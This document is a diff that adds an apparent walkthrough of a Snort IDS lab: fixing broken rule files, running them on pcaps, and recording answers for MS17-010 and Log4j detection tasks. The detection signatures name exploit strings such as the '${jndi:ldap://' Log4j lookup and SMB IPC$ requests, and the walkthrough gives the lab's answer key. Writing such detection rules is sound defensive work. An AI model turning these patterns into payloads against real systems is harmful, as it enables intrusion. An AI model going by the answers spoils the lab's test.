@@ -1922,3 +1922,965 @@ root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting
 # additions here.
 
 alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
+
+--repair--
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-1.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any 3372 -> any any (msg:"Troubleshooting 1"; sid:1000001; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-1.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           16 ( 13.913%)
+     Logged:           16 ( 13.913%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*16*
+Fix the syntax error in local-2.rules file and make it work smoothly.
+What is the number of the detected packets?
+Don't forget the ports! (any)
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-2.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-2.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-2.rules -r mx-1.pcap -A console
+
+Action Stats:
+     Alerts:           68 ( 59.130%)
+     Logged:           68 ( 59.130%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*68*
+Fix the syntax error in local-3.rules file and make it work smoothly.
+What is the number of the detected packets?
+SIDs should be unique!
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-3.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-3.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
+alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-3.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           87 ( 75.652%)
+     Logged:           87 ( 75.652%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*87*
+Fix the syntax error in local-4.rules file and make it work smoothly.
+What is the number of the detected packets?
+Semicolons matters!
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-4.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-4.rules
+```
+```text
+# -------------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# -------------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
+alert tcp any 80,443 -> any any (msg:"HTTPX Packet Found"; sid:1000002; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-4.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           90 ( 78.261%)
+     Logged:           90 ( 78.261%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*90*
+Fix the syntax error in local-5.rules file and make it work smoothly.
+What is the number of the detected packets?
+Direction and colons! (->)
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-5.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-5.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert icmp any any <> any any (msg:"ICMP Packet Found";sid:1000001; rev:1;)
+alert icmp any any -> any any (msg:"Inbound ICMP Packet Found";sid:1000002; rev:1;)
+alert tcp any any -> any 80,443 (msg:"HTTPX Packet Found";sid:1000003; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-5.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:          155 (134.783%)
+     Logged:          155 (134.783%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*155*
+Fix the logical error in local-6.rules file and make it work smoothly to create alerts.
+What is the number of the detected packets?
+Case sensitivity matters! Use the capitals or nocase!
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-6.rules
+```
+```text
+# -------------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# -------------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001;
+
+repair
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-6.rules
+```
+```text
+# -------------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# -------------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid: 100001; rev:1;
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-6.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:            2 (  1.739%)
+     Logged:            2 (  1.739%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*2*
+Fix the logical error in local-7.rules file and make it work smoothly to create alerts.
+What is the name of the required option:
+Rules without messages doesn't make sense!
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-7.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any <> any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
+
+repair
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# nano local-7.rules 
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# cat local-7.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any <> any 80  (msg:"Found it";content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)# sudo snort -c local-7.rules -r mx-1.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:            9 (  7.826%)
+     Logged:            9 (  7.826%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:          115 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*msg*
+### Using External Rules (MS17-010)
+Let's use external rules to fight against the latest threats!
+Navigate to the task folder.
+Use the given pcap file.
+Use the given rule file (local.rules) to investigate the ms1710 exploitation.
+What is the number of detected packets?
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
+ Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
+'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-7 (MS17-10)'/
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# ls
+local-1.rules  local.rules  ms-17-010.pcap
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# cat local.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; sid: 2094284; rev: 2;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "NTLMSSP";sid: 2094286; rev: 2;) 
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "WindowsPowerShell";sid: 20244223; rev: 3;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "ADMIN$";sid:20244224; rev: 2;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 20244226; rev: 2;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 209462812; rev: 3;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "samr"; sid: 209462813; rev: 3;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "browser"; sid: 209462814; rev: 2;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established;content: "epmapper";sid: 209462815; rev: 2;)
+alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "eventlog"; sid: 209462816; rev: 2;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "/root/smbshare"; sid: 20242290; rev: 2;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "\\PIPE"; sid: 20242291; rev: 3;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "smbshare"; sid: 20242292; rev: 3;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "srvsvc"; sid: 20242293; rev: 2;)
+alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB3|00 00 00 00|"; depth:9; offset:4; byte_extract:2,26,TotalDataCount,relative,little; byte_test:2,>,TotalDataCount,20,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,blog.talosintelligence.com/2017/05/wannacry.html; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:41978; rev:5;)
+alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB|A0 00 00 00 00|"; depth:9; offset:4; content:"|01 00 00 00 00|"; within:5; distance:59; byte_test:4,>,0x8150,-33,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:42944; rev:2;)
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; reference: ExploitDatabase (ID’s - 42030, 42031, 42315); priority: 10; sid: 2094284; rev: 2;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local.rules -r ms-17-010.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:        25154 ( 53.916%)
+     Logged:        25154 ( 53.916%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:        46654 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*25154*
+Clear the previous log and alarm files.
+Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
+What is the number of detected packets?
+The "content" option will help you to filter the payload.
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# cat local-1.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local-1.rules -r ms-17-010.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           12 (  0.026%)
+     Logged:           12 (  0.026%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            0
+      Alert:            0
+Verdicts:
+      Allow:        46654 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
+Snort exiting
+```
+*12*
+Investigate the log/alarm files.
+What is the requested path?
+Ends with "\IPC$"
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local.rules -r ms-17-010.pcap -A console -dev -l .
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# ls -lah
+total 71M
+drwxrwxr-x  2 ubuntu ubuntu 4.0K Dec  7 02:38 .
+drwx------ 10 ubuntu ubuntu 4.0K Feb  2  2022 ..
+-rw-rw-r--  1 ubuntu ubuntu  269 Dec  7 02:33 local-1.rules
+-rw-rw-r--  1 ubuntu ubuntu 4.1K Dec 24  2021 local.rules
+-rw-rw-r--  1 ubuntu ubuntu  37M Dec 24  2021 ms-17-010.pcap
+-rw-------  1 root   root    35M Dec  7 02:40 snort.log.1670380683
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-10)# sudo snort -c local-1.rules -r ms-17-010.pcap -A console -dev
+
+WARNING: No preprocessors configured for policy 0.
+05/18-08:12:07.219643 00:19:BB:4F:4C:D8 -> 00:25:B3:F5:FA:74 type:0x800 len:0xB0
+192.168.116.138:445 -> 192.168.116.149:49368 TCP TTL:128 TOS:0x0 ID:251 IpLen:20 DgmLen:162 DF
+***AP*** Seq: 0x22312580  Ack: 0xFF7320A3  Win: 0x100  TcpLen: 20
+00 00 00 76 FF 53 4D 42 73 00 00 00 00 98 01 20  ...v.SMBs...... 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B  ............../K
+00 08 C5 5E 03 FF 00 76 00 00 00 4D 00 57 69 6E  ...^...v...M.Win
+64 6F 77 73 20 37 20 45 6E 74 65 72 70 72 69 73  dows 7 Enterpris
+65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
+61 63 6B 20 31 00 57 69 6E 64 6F 77 73 20 37 20  ack 1.Windows 7 
+45 6E 74 65 72 70 72 69 73 65 20 36 2E 31 00 54  Enterprise 6.1.T
+45 53 54 44 4F 4D 41 49 4E 00                    ESTDOMAIN.
+
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+WARNING: No preprocessors configured for policy 0.
+05/18-08:12:07.219861  [**] [1:2094285:3] Exploit Detected! [**] [Priority: 0] {TCP} 192.168.116.149:49368 -> 192.168.116.138:445
+05/18-08:12:07.219861 00:25:B3:F5:FA:74 -> 00:19:BB:4F:4C:D8 type:0x800 len:0x83
+192.168.116.149:49368 -> 192.168.116.138:445 TCP TTL:128 TOS:0x0 ID:575 IpLen:20 DgmLen:117 DF
+***AP*** Seq: 0xFF7320A3  Ack: 0x223125FA  Win: 0xFF  TcpLen: 20
+00 00 00 49 FF 53 4D 42 75 00 00 00 00 18 01 20  ...I.SMBu...... 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B  ............../K
+00 08 C5 5E 04 FF 00 00 00 00 00 01 00 1C 00 00  ...^............
+5C 5C 31 39 32 2E 31 36 38 2E 31 31 36 2E 31 33  \\192.168.116.13
+38 5C 49 50 43 24 00 3F 3F 3F 3F 3F 00           8\IPC$.?????.
+
+find:IPC
+
+\\192.168.116.138\IPC$
+```
+*\\192.168.116.138\IPC$*
+What is the CVSS v2 score of the MS17-010 vulnerability?
+External search will help you to find the score!
+https://www.cvedetails.com/cve/CVE-2017-0144/
+```text
+CVSS Score
+
+9.3
+
+Confidentiality Impact
+
+Complete (There is total information disclosure, resulting in all system files being revealed.)
+
+Integrity Impact
+
+Complete (There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)
+
+Availability Impact
+
+Complete (There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)
+
+Access Complexity
+
+Medium (The access conditions are somewhat specialized. Some preconditions must be satistified to exploit)
+
+Authentication
+
+Not required (Authentication is not required to exploit the vulnerability.)
+
+Gained Access
+
+None
+
+Vulnerability Type(s)
+
+Execute Code
+```
+*9.3*
+### Using External Rules (Log4j)
+Let's use external rules to fight against the latest threats!
+Navigate to the task folder.
+Use the given pcap file.
+Use the given rule file (local.rules) to investigate the log4j exploitation.
+What is the number of detected packets?
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# ls
+ Config-Samples  'TASK-3 (FTP)'  'TASK-5 (TorrentMetafile)'  'TASK-7 (MS17-10)'
+'TASK-2 (HTTP)'  'TASK-4 (PNG)'  'TASK-6 (Troubleshooting)'  'TASK-8 (Log4j)'
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files# cd 'TASK-8 (Log4j)'/
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# ls
+local-1.rules  local.rules  log4j.pcap
+
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local.rules -r log4j.pcap -A console
+
+===============================================================================
+Action Stats:
+     Alerts:           26 (  0.057%)
+     Logged:           26 (  0.057%)
+     Passed:            0 (  0.000%)
+Limits:
+      Match:            0
+      Queue:            0
+        Log:            0
+      Event:            4
+      Alert:            0
+Verdicts:
+      Allow:        45891 (100.000%)
+      Block:            0 (  0.000%)
+    Replace:            0 (  0.000%)
+  Whitelist:            0 (  0.000%)
+  Blacklist:            0 (  0.000%)
+     Ignore:            0 (  0.000%)
+      Retry:            0 (  0.000%)
+===============================================================================
++-----------------------[filtered events]--------------------------------------
+| gen-id=1      sig-id=21003728   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=21003731   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
+| gen-id=1      sig-id=21003730   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
+Snort exiting
+```
+*26*
+Investigate the log/alarm files.
+How many rules were triggered?.
+You can investigate the alarm file with CLI commands (cat, grep). OR, you can read the snort output summary.
+```text
+root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# cat local.rules
+```
+```text
+# ----------------
+```
+```text
+# LOCAL RULES
+```
+```text
+# ----------------
+```
+```text
+# This file intentionally does not come with signatures.  Put your local
+```
+```text
+# additions here.
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;)
+```
+```text
+# Better and stricter rules, also detects evasion techniques
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Hi"; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Ui"; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;) 
+
+alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Pi"; flowbits:set, fox.apachelog4j.rce.strict; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)
+
+===============================================================================
+Run time for packet processing was 7.1666 seconds
+Snort processed 45891 packets.
+Snort ran for 0 days 0 hours 0 minutes 7 seconds
+   Pkts/sec:         6555
+===============================================================================
+Memory usage summary:
+  Total non-mmapped bytes (arena):       2600960
+  Bytes in mapped regions (hblkhd):      17784832
+  Total allocated space (uordblks):      2226448
+  Total free space (fordblks):           374512
+  Topmost releasable block (keepcost):   66912
+===============================================================================
+Packet I/O Totals:
+   Received:        45891
+   Analyzed:        45891 (100.000%)
+    Dropped:            0 (  0.000%)
+   Filtered:            0 (  0.000%)
+Outstanding:            0 (  0.000%)
+   Injected:            0
+===============================================================================
+Breakdown by protocol (includes rebuilt packets):
+        Eth:        45891 (100.000%)
+       VLAN:           10 (  0.022%)
+        IP4:        45981 (100.196%)
+       Frag:            4 (  0.009%)
+       ICMP:         5742 ( 12.512%)
+        UDP:         1769 (  3.855%)
+        TCP:        38378 ( 83.629%)
+        IP6:            0 (  0.000%)
+    IP6 Ext:            0 (  0.000%)
+   IP6 Opts:            0 (  0.000%)
+      Frag6:            0 (  0.000%)
+      ICMP6:            0 (  0.000%)
+       UDP6:            0 (  0.000%)
+       TCP6:            0 (  0.000%)
+     Teredo:            0 (  0.000%)
+    ICMP-IP:            0 (  0.000%)
+    IP4/IP4:            0 (  0.000%)
+    IP4/IP6:            0 (  0.000%)
+    IP6/IP4:            0 (  0.000%)
